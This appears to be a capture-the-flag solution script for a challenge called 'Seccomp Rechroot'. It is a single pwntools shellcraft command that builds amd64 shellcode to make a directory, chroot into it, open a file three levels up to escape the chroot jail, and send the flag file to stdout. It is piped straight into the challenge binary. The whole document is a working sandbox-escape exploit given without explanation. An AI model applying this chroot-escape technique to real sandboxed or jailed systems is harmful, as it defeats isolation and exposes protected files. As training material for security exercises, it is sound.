# Seccomp Rechroot
# shellcheck disable=SC2211

pwn shellcraft amd64.mkdir x 0o777 + amd64.chroot x + amd64.open ../../../flag 0 + amd64.sendfile 1 rax 0 64 | /challenge/* /